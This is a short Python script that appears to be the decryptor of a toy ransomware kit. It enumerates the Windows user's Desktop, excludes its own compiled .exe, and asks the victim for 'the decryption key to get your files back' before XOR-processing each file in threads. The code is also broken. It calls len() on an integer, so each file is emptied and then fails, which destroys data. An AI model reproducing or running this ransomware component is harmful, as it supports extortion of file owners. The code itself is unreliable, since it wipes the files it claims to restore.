import os
import threading
import queue

def decrypt(key):
    while True:
        file = q.get()
        print(f'decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key_index) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} successfully decrypted')
        except:
            print('failed to decrypt the file')
        q.task_done()

# encryption info
encryptionLevel = 512 // 8
keyCharOptions = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~`!@#$%^&*()_+=-<>?'
keyCharOptionsLen = len(keyCharOptions)

# grab the files to decrypt
print('Getting files ready...')
desktopPath = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktopPath)
absFiles = []
for f in files:
    if os.path.isfile(f'{desktopPath}\\{f}') and f != __file__[:-2]+'exe':
        absFiles.append(f'{desktopPath}\\{f}')
print('successfulle located all te files')

key = input('enter the decryption key to get your files back')

# setup queue with jobs for threads to decrypt
q = queue.Queue()
for f in absFiles:
    q.put(f)

# setup threads to get ready for decryption
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('decryption is completed')
input()
